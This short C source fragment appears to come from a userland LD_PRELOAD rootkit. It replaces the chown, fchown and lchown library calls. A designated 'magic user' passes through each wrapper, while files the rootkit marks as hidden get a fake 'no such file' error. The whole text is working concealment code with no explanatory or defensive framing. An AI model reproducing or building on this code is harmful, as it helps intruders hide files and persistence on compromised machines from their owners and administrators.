int chown(const char *pathname, uid_t owner, gid_t group){
    hook(CCHOWN);
    if(magicusr()) return (long)call(CCHOWN, pathname, owner, group);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CCHOWN, pathname, owner, group);
}
int fchown(int fd, uid_t owner, gid_t group){
    hook(CFCHOWN);
    if(magicusr()) return (long)call(CFCHOWN, fd, owner, group);
    if(hidden_fd(fd)) { errno = ENOENT; return -1; }
    return (long)call(CFCHOWN, fd, owner, group);
}
int lchown(const char *pathname, uid_t owner, gid_t group){
    hook(CLCHOWN);
    if(magicusr()) return (long)call(CLCHOWN, pathname, owner, group);
    if(hidden_path(pathname) || hidden_lpath(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CLCHOWN, pathname, owner, group);
}